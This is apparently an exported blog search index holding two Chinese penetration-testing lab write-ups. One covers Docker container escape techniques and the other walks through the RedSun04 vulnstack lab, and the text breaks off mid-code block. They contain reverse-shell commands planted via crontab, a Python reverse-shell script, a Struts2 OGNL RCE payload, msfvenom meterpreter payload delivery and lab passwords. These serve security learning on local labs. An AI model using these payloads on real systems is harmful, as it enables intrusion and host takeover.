<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>docker逃逸</title>
    <link href="/2024/02/19/%E6%B8%97%E9%80%8F/docker%E9%80%83%E9%80%B8/"/>
    <url>/2024/02/19/%E6%B8%97%E9%80%8F/docker%E9%80%83%E9%80%B8/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>刚好做到红日4里需要进行docker 逃逸，发现不会学习一下</p><h1 id="判断是否存在于"><a href="#判断是否存在于" class="headerlink" title="判断是否存在于"></a>判断是否存在于</h1><ol><li><p>检查根目录</p><p>检查根目录是否存在<code>.dockerenv</code></p><p>如果有则说明存在于docker 里面</p></li><li><p>检查**&#x2F;proc&#x2F;1&#x2F;cgroup**</p><p>检查这个文件夹里是否存在与docker 相关的字段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /proc/1/cgroup<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219181808996.png" alt="image-20240219181808996"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219181824312.png" alt="image-20240219181824312"></p></li></ol><h1 id="Docker-Remote-API未授权访问逃逸"><a href="#Docker-Remote-API未授权访问逃逸" class="headerlink" title="Docker Remote API未授权访问逃逸"></a>Docker Remote API未授权访问逃逸</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><blockquote><p>在使用<code>docker swarm</code>的时候，管理的<code>docker</code>节点上会开放一个<code>TCP</code>端口<code>2375</code>，默认绑定在<code>0.0.0.0</code>上，造成任何人都可以访问管理端的<code>2375</code>端口，任何人都可以远程控制管理的<code>docker</code>环境。</p></blockquote><h2 id="漏洞判断"><a href="#漏洞判断" class="headerlink" title="漏洞判断"></a>漏洞判断</h2><blockquote><p><a href="http://192.168.59.147:2375/version">http://192.168.59.147:2375/version</a><br><a href="http://192.168.59.147:2375/info">http://192.168.59.147:2375/info</a></p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/vulhub/</span>vulhub.git  <br>docker-compose build docker-compose up -d  <br>docker ps -a | grep rce  <br></code></pre></td></tr></table></figure><p>访问ip:2375&#x2F;version\</p><p><img src="https://ask.qcloudimg.com/http-save/yehe-1435649/6747286849b18b4630d06b86e9a45902.png" alt="48852cf4de76a97f252ef9ee628d2179.png"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>先查看磁盘分区是什么情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">flisk -l<br><span class="hljs-built_in">df</span> -h <br></code></pre></td></tr></table></figure><p>发现flisk 用不了，就是用的df</p><p>发现没有可以利用的磁盘</p><p>如果发现可以利用的磁盘的话，可以尝试挂载到其他地方</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mount <span class="hljs-regexp">/dev/</span>sda1 /hacker<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/v2-511453d6f6c73a08e3533fa98a1f66a6_1440w.webp" alt="img"></p><p>现在就相当于得到了宿主机的所有文件</p><p>可以使用定时任务的方式获取shell</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arcade">echo <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.59.145/6666 0&gt;&amp;1&quot;</span> &gt;<span class="hljs-regexp">/hacker/</span>hacker.sh<br><br>echo <span class="hljs-string">&quot;* * * * * root bash /hacker.sh&quot;</span> &gt;&gt; <span class="hljs-regexp">/hacker/</span>etc/crontab（每分钟执行一次）<br></code></pre></td></tr></table></figure><p>&#x2F;hacker&#x2F;etc&#x2F;crontab  到这个文件夹里面</p><h1 id="privileged特权模式启动容器逃逸"><a href="#privileged特权模式启动容器逃逸" class="headerlink" title="privileged特权模式启动容器逃逸"></a>privileged特权模式启动容器逃逸</h1><p>如果发现是这种方式，其实是最方便的逃逸的</p><blockquote><p><code>docker</code>管理员可通过<code>mount</code>命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，可直接通过<code>chroot</code>切换根目录、写<code>ssh</code>公钥和<code>crontab</code>计划任何等逃逸到宿主机。</p></blockquote><h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">cat <span class="hljs-regexp">/proc/</span>self/status |<span class="hljs-keyword">grep</span> Cap<br></code></pre></td></tr></table></figure><p>判断是否是特权模式启动，如果是以特权模式启动的话，<code>CapEff</code>对应的掩码值应该为<code>0000003fffffffff</code></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220101107010.png" alt="image-20240220101107010"></p><p>这个是不存在这个漏洞</p><h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>在<code>docker</code>容器中查看系统磁盘分区情况，在新建一个目录，将宿主机所在磁盘挂载到新建的目录中。</p><p>利用方式和前面的是一样的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">fdisk -l<br><span class="hljs-built_in">mkdir</span> /hacker<br>mount /dev/sda5 /hacker<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">touch <span class="hljs-regexp">/hacker/</span>hacker.sh<br>echo <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.59.145/6666 0&gt;&amp;1&quot;</span> &gt;<span class="hljs-regexp">/hacker/</span>hacker.sh<br>echo <span class="hljs-string">&quot;* * * * * root bash /hacker.sh&quot;</span> &gt;&gt; <span class="hljs-regexp">/hacker/</span>etc/crontab<br></code></pre></td></tr></table></figure><h1 id="危险挂载导致Docker逃逸"><a href="#危险挂载导致Docker逃逸" class="headerlink" title="危险挂载导致Docker逃逸"></a>危险挂载导致Docker逃逸</h1><p>在启动<code>docker</code>容器时，将服务器中的根目录或敏感目录挂载到容器中时，可能会造成<code>docker</code>逃逸。</p><p>这个都是受害者的管理者的配置问题</p><h2 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>这个方式，由于受害者已经挂载了，所以就不需要手动挂载了</p><p>找对挂载点，然后写定时任务</p><h1 id="挂载Docker-Socket逃逸"><a href="#挂载Docker-Socket逃逸" class="headerlink" title="挂载Docker Socket逃逸"></a>挂载Docker Socket逃逸</h1><p>在启动<code>docker</code>容器时，将宿主机<code>/var/run/docker.sock</code>文件挂载到<code>docker</code>容器中，在<code>docker</code>容器中，也可以操作宿主机的<code>docker</code>。</p><p><code>Docker</code>采用<code>C/S</code>架构，我们平常使用的<code>Docker</code>命令中，<code>docker</code>即为<code>client</code>，<code>Server</code>端的角色由<code>docker daemon</code>扮演，二者之间通信方式有以下3种，使用下面命令，就可以操作目标<code>docker</code>，使用<code>docker</code>命令，操作<code>docker</code>：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">unix:///var/run/docker.sock<br>tcp://host:port<br>fd://socketfd<br></code></pre></td></tr></table></figure><h2 id="漏洞验证-1"><a href="#漏洞验证-1" class="headerlink" title="漏洞验证"></a><strong>漏洞验证</strong></h2><p>如果发现  docker.sock 文件，说明可能存在漏洞</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/docker%E9%80%83%E9%80%B8/image-20240220103505447.png" alt="image-20240220103505447"></p><p>发现没有</p><p>如果发现</p><h2 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>在<code>docker</code>容器中安装<code>docker</code>。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">apt-<span class="hljs-built_in">get</span> update<br>apt-<span class="hljs-built_in">get</span> install docker.io<br></code></pre></td></tr></table></figure><p>在容器中操控主机的docker ,在<code>docker</code>容器中，使用命令查看宿主机拉取的镜像。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker -H unix:<span class="hljs-regexp">//</span>var<span class="hljs-regexp">/run/</span>docker.sock images <br></code></pre></td></tr></table></figure><p>在<code>docker</code>容器中，使用命令再运行一个<code>docker</code>容器,将宿主机的根目录挂载到<code>ubuntu:16.04</code>的<code>test</code>目录中，造成<code>docker</code>逃逸，在通过写计划任务方式，反弹<code>shell</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker -H unix:<span class="hljs-regexp">//</span>var<span class="hljs-regexp">/run/</span>docker.sock run -v <span class="hljs-regexp">/:/</span>test -it ubuntu:<span class="hljs-number">16.04</span> <span class="hljs-regexp">/bin/</span>bash<br>ls /test<br></code></pre></td></tr></table></figure><h1 id="挂载宿主机procfs逃逸"><a href="#挂载宿主机procfs逃逸" class="headerlink" title="挂载宿主机procfs逃逸"></a>挂载宿主机procfs逃逸</h1><p><code>procfs</code>中的<code>/proc/sys/kernel/core_pattern</code>负责配置进程崩溃时内存转储数据的导出方式，如果<code>/proc/sys/kernel/core_pattern</code>文件中的首个字符是管道符<code>|</code> ，那么该行的剩余内容将被当作用户空间程序或脚本解释并执行。当利用这种方式进行<code>docker</code>逃逸时，触发条件比较苛刻，需要有进程奔溃才能触发。</p><h2 id="漏洞验证-2"><a href="#漏洞验证-2" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>如果找到两个<code>core_pattern</code>文件，那可能就是挂载了宿主机的<code>procfs</code></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/docker%E9%80%83%E9%80%B8/image-20240220110152370.png" alt="image-20240220110152370"></p><p>发现存在</p><h2 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>当启动一个容器时，会在<code>/var/lib/docker/overlay2</code>目录下生成一层容器层，容器层里面包括<code>diff、link、lower、merged、work</code>目录，而<code>docker</code>容器的目录保存在<code>merged</code>目录中，通过命令找到当前容器在宿主机下的绝对路径，<code>workdir</code>代表的是<code>docker</code>容器在宿主机中的绝对路径。</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">cat <span class="hljs-regexp">/proc/m</span>ounts | <span class="hljs-keyword">grep</span> docker<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/docker%E9%80%83%E9%80%B8/image-20240220110354943.png" alt="image-20240220110354943"></p><p>发现存在 workdir </p><p>安装vim 和gcc </p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">apt-<span class="hljs-built_in">get</span> <span class="hljs-keyword">update</span> -<span class="hljs-keyword">y</span> &amp;&amp; apt-getinstall <span class="hljs-keyword">vim</span> gcc -<span class="hljs-keyword">y</span><br></code></pre></td></tr></table></figure><p>创建一个反弹<code>Shell</code>的<code>py</code>脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python">vim /tmp/.t.py<br><br><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span>  os<br><span class="hljs-keyword">import</span> pty<br><span class="hljs-keyword">import</span> socket<br>lhost = <span class="hljs-string">&quot;192.168.59.145&quot;</span><br>lport = <span class="hljs-number">6666</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>   s.connect((lhost, lport))<br>   os.dup2(s.fileno(), <span class="hljs-number">0</span>)<br>   os.dup2(s.fileno(), <span class="hljs-number">1</span>)<br>   os.dup2(s.fileno(), <span class="hljs-number">2</span>)<br>   os.putenv(<span class="hljs-string">&quot;HISTFILE&quot;</span>, <span class="hljs-string">&#x27;/dev/null&#x27;</span>)<br>   pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)<br>   <span class="hljs-comment"># os.remove(&#x27;/tmp/.t.py&#x27;)</span><br>   s.close()<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>   main()<br></code></pre></td></tr></table></figure><p>我们修改<code>/host/proc/sys/kernel/core_pattern</code>文件以达到修改宿主机<code>/proc/sys/kernel/core_pattern</code>的目的。</p><p>创建一个崩溃的程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">vim t.c<br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>  &#123;<br>   <span class="hljs-type">int</span> *a  = <span class="hljs-literal">NULL</span>;<br>   *a = <span class="hljs-number">1</span>;<br>   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>gcc t.c -o t<br>./t<br></code></pre></td></tr></table></figure><p>然后运行这个</p><h1 id="脏牛漏洞实现Docker逃逸"><a href="#脏牛漏洞实现Docker逃逸" class="headerlink" title="脏牛漏洞实现Docker逃逸"></a>脏牛漏洞实现Docker逃逸</h1><p>当宿主机存在<code>Dirty Cow(CVE-2016-5195)</code>漏洞时，利用该漏洞，可实现<code>Docker</code>容器逃逸，获得<code>root</code>权限的<code>shell</code>。</p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RedSun04</title>
    <link href="/2024/02/19/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/RedSun04/"/>
    <url>/2024/02/19/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/RedSun04/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>开始时间 2024-2-19 15:23</p><p>完成时间 2024-2-21 17:25</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>靶场下载地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/6/">http://39.98.79.56/vuln/detail/6/﻿</a></p><p>共有三台主机DC、WEB、WIN7</p><h2 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h2><p>主机密码</p><blockquote><p>WEB主机 ubuntu:ubuntu</p><p>WIN7主机 douser:Dotest123</p><p>(DC)WIN2008主机 administrator:Test2008</p></blockquote><h2 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h2><p>创建两个虚拟网卡</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219154516050.png" alt="image-20240219154516050"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219155320775.png" alt="image-20240219155320775">保证内网</p><p>发现保证一个183 网卡就行了，还有一个是nat 网卡替代，模拟出网</p><p>web</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219154705801.png" alt="image-20240219154705801">win7 </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219155100625.png" alt="image-20240219155100625"></p><p>开启环境</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> docker start ec <span class="hljs-number">17</span> <span class="hljs-number">09</span> bb da <span class="hljs-number">3</span>d ab ad<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219155415865.png" alt="image-20240219155415865"></p><p>winserver 2008</p><p>由于登陆需要修改密码，就暂时不登录了</p><p>win7</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219155540393.png" alt="image-20240219155540393"></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><ol><li><p>ip 查找</p><p>使用nmap 做存活探测</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sP <span class="hljs-number">192.168.79.1</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219160104534.png" alt="image-20240219160104534"></p><p>发现目标</p></li><li><p>端口扫描</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219160547746.png" alt="image-20240219160547746"></p></li><li><p>每一个端口访问</p><p>2001</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219160625449.png" alt="image-20240219160625449"></p><p>2002</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219160631972.png" alt="image-20240219160631972"></p><p>2003</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219160638589.png" alt="image-20240219160638589"></p></li></ol><h1 id="web-渗透"><a href="#web-渗透" class="headerlink" title="web 渗透"></a>web 渗透</h1><ol><li><p>针对2001</p><p>没发现个什么东西<br>尝试抓包看看</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219160851080.png" alt="image-20240219160851080"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219161152401.png" alt="image-20240219161152401"></p><p>发现是s2 搭建的网站，尝试利用</p><p>尝试工具利用</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219161444850.png" alt="image-20240219161444850"></p><p>发现存在漏洞</p><p>上传webshell</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219162922139.png" alt="image-20240219162922139"></p><p>工具利用失败？</p><p>尝试手动利用，该漏洞可以反弹shell </p><p>等反弹shell 之后上传msf-payload </p><blockquote><p><a href="https://tsy244.github.io/2024/01/16/%E6%B8%97%E9%80%8F/Struts2/#strruts2-032">Struts2 - AU9U5T (tsy244.github.io)</a></p></blockquote><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">Content-Type:<span class="hljs-string">&quot;%&#123;(<span class="hljs-subst">#nike</span>=&#x27;multipart/form-data&#x27;).(<span class="hljs-subst">#dm</span>=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(<span class="hljs-subst">#_memberAccess</span>?(<span class="hljs-subst">#_memberAccess</span>=<span class="hljs-subst">#dm</span>):((<span class="hljs-subst">#container</span>=<span class="hljs-subst">#context</span>[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(<span class="hljs-subst">#ognlUtil</span>=<span class="hljs-subst">#container</span>.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(<span class="hljs-subst">#ognlUtil</span>.getExcludedPackageNames().clear()).(<span class="hljs-subst">#ognlUtil</span>.getExcludedClasses().clear()).(<span class="hljs-subst">#context</span>.setMemberAccess(<span class="hljs-subst">#dm</span>)))).(<span class="hljs-subst">#cmd</span>=&#x27;whoami&#x27;).(<span class="hljs-subst">#iswin</span>=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(<span class="hljs-subst">#cmds</span>=(<span class="hljs-subst">#iswin</span>?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,<span class="hljs-subst">#cmd</span>&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,<span class="hljs-subst">#cmd</span>&#125;)).(<span class="hljs-subst">#p</span>=new java.lang.ProcessBuilder(<span class="hljs-subst">#cmds</span>)).(<span class="hljs-subst">#p</span>.redirectErrorStream(true)).(<span class="hljs-subst">#process</span>=<span class="hljs-subst">#p</span>.start()).(<span class="hljs-subst">#ros</span>=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(<span class="hljs-subst">#process</span>.getInputStream(),<span class="hljs-subst">#ros</span>)).(<span class="hljs-subst">#ros</span>.flush())&#125;&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219163323136.png" alt="image-20240219163323136"></p><p>开启监听</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219163701376.png" alt="image-20240219163701376"></p><p>反弹shell</p><p>先将反弹shell 执行换一种形式，因为java 对一些字符有特殊意义</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219163558551.png" alt="image-20240219163558551"></p><p>放入bp</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219163759169.png" alt="image-20240219163759169"></p><p>没有发现命令</p><p>那就换一个形式</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219163923255.png" alt="image-20240219163923255"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219163950680.png" alt="image-20240219163950680"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219163911105.png" alt="image-20240219163911105"></p><p>成功反弹</p><p>生成payload </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">msfvenom</span> -p linux/x64/meterpreter/reverse_tcp -h <span class="hljs-number">192.168.79.138</span> -p <span class="hljs-number">20000</span> -f elf -o l_x64_revers_20000<br></code></pre></td></tr></table></figure><p>开启http服务</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">python -m http.<span class="hljs-keyword">server</span><br></code></pre></td></tr></table></figure><p>访问下载</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl  http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">79.138</span>:<span class="hljs-number">8000</span><span class="hljs-regexp">/l_x64_revers_20000 -O /</span>tmp/test<br></code></pre></td></tr></table></figure><p>攻击机开启handler</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">handler</span> -p linux/x64/meterpreter/reverse_tcp -H <span class="hljs-number">192.168.79.138</span> -P <span class="hljs-number">20000</span><br></code></pre></td></tr></table></figure><p>受害者</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219170413240.png" alt="image-20240219170413240"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219170420744.png" alt="image-20240219170420744"></p><p>成功反弹</p></li><li><h6 id="使用agent-搭建代理"><a href="#使用agent-搭建代理" class="headerlink" title="使用agent 搭建代理"></a>使用agent 搭建代理</h6><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219170803792.png" alt="image-20240219170803792"></p><p>上传agent</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219170948862.png" alt="image-20240219170948862"></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">./agent -c <span class="hljs-number">192.168</span>.<span class="hljs-number">79.138</span>:<span class="hljs-number">20090</span> -s hack <span class="hljs-meta">&amp; </span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219171121706.png" alt="image-20240219171121706"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219171323455.png" alt="image-20240219171323455"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219171403189.png" alt="image-20240219171403189"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219171429285.png" alt="image-20240219171429285"></p></li><li><p>针对2002</p><p>直接使用xray 扫描</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220140917323.png" alt="image-20240220140917323"></p><p>尝试利用</p><p>这个由于没有禁用put 和get 可以任意上传</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220141315331.png" alt="image-20240220141315331"></p><p>尝试上传webshell</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code 